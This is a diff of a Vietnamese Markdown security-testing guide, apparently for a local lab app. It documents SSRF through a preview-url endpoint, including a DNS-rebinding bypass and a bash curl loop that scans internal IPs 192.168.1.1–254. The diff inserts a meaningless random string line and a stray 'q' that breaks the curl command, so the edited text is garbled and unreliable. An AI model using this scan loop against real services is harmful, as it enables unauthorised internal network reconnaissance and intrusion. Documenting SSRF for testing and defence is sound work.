@@ -112,13 +112,13 @@ curl -X POST http://localhost:8081/api/posts/preview-url \
 2. Server sẽ resolve lần đầu (pass validation), nhưng request thực tế đi đến IP internal
 
 ### 6. Scan Internal Network
-
+KogFVkSUT9y3s8wc02n1pedom0sNvD82ArmBKZAR
 ```bash
 # Scan dải IP internal
 for i in {1..254}; do
   curl -X POST http://localhost:8081/api/posts/preview-url \
     -H "Content-Type: application/json" \
-    -H "Authorization: Bearer YOUR_JWT_TOKEN" \
+    -H "Authorization: Bearer YOUR_JWT_TOKEN" q\
     -d "{\"url\": \"http://192.168.1.$i\"}"
 done
 ```
